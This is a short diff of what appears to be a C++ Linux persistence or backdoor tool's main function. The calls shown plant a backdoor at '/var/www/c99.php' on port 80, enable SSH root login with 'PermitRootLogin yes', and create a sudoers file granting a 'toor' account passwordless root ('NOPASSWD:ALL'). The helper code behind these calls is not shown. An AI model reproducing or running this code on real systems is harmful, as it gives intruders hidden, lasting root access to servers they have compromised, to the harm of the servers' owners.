@@ -1,11 +1,6 @@
 #include <iostream>
-#include "check.hpp"
 #include "backdoor.hpp"
 #include "serviceConfig.hpp"
-
-#define success "\e[01;32m[+]\e[00m"
-#define error "\e[01;31m[!]\e[00m"
-
 
 int main(){
 
@@ -14,7 +9,7 @@ int main(){
     backdoor("/var/www/c99.php", "80");
     backdoor("/home/ubuntu/test.txt");
     //isStringInFile("/etc/ssh/sshd_config", "PermitRootLogin yes");
-    rootLoginSSH();
+    rootLoginSSH("PermitRootLogin yes");
     sudoersFile("/etc/sudoers.d/toor");
     sudoersEntry("toor ALL=(ALL) NOPASSWD:ALL");
 
